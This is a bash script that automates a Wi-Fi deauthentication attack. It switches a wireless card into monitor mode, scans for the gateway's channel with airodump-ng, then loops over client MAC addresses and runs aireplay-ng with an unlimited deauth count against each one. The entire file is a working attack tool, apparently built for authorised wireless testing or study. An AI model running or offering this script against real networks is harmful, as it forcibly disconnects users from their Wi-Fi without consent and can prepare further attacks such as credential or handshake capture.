#!/bin/bash

router_mac=$(cat _gateway/MAC.txt)
interface=$(cat _gateway/IF.txt)
current_list=$(cat store/txt/file.txt)
mac_to_deauth=$(cat store/txt/current.txt)

sudo ifconfig "$interface" down
sudo airmon-ng check kill
sudo iwconfig "$interface" mode monitor
sudo ifconfig "$interface" up
sudo airodump-ng "$interface" --write store/csv/channel
python3 get_host_mac.py
for i in $current_list
do
mac=$(echo "$i" | head -n1 | cut -d "-" -f1 )
ch=$(echo "$i" | head -n1 | cut -d "-" -f2 )
if [ "$mac" == "$router_mac" ]
then
echo "$mac"
sudo airodump-ng --bssid "$router_mac" -c "$ch" "$interface" --write store/csv/mac
fi
done
python3 get_mac_ch.py
for val in $mac_to_deauth
do
sudo aireplay-ng --deauth 0 -a "$router_mac" -c "$val" "$interface"&
done
sudo ifconfig "$interface" down
sudo iwconfig "$interface" mode managed
sudo service NetworkManager restart
